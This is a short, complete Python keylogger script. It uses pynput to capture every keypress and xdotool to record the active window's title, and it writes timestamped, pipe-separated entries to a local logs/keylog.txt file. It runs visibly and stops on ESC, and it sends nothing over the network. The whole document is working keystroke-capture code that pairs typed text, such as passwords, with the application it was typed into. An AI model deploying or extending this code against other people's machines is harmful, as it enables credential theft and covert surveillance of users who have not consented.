from pynput import keyboard
from datetime import datetime
import os
import subprocess

# Folder for logs
LOG_FOLDER = "logs"
os.makedirs(LOG_FOLDER, exist_ok=True)
LOG_FILE = os.path.join(LOG_FOLDER, "keylog.txt")

def get_active_window():
    """Get the currently active window's title using xdotool"""
    try:
        window = subprocess.check_output(
            ['xdotool', 'getwindowfocus', 'getwindowname'],
            stderr=subprocess.DEVNULL
        ).decode('utf-8').strip()
        return window if window else "Unknown"
    except Exception:
        return "Unknown"

def format_key(key):
    """Format special keys safely for logging"""
    if hasattr(key, 'char') and key.char is not None:
        char = key.char
        # Replace pipe characters to prevent breaking CSV format
        if char == "|":
            char = "[PIPE]"
        elif char == "\n":
            char = "[ENTER]"
        elif char == "\t":
            char = "[TAB]"
        return char
    else:
        special_keys = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "[ENTER]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.shift_r: "[SHIFT]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.esc: "[ESC]"
        }
        return special_keys.get(key, f"[{key}]")

def on_press(key):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    active_window = get_active_window()
    formatted_key = format_key(key)
    
    # Ensure we always have three fields
    log_entry = f"{timestamp} | {active_window} | {formatted_key}\n"

    try:
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
    except Exception as e:
        print(f"Error writing to file: {e}")

def on_release(key):
    # Stop the keylogger on ESC
    if key == keyboard.Key.esc:
        print("Keylogger stopped.")
        return False

print("Keylogger running... Press ESC to stop.")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()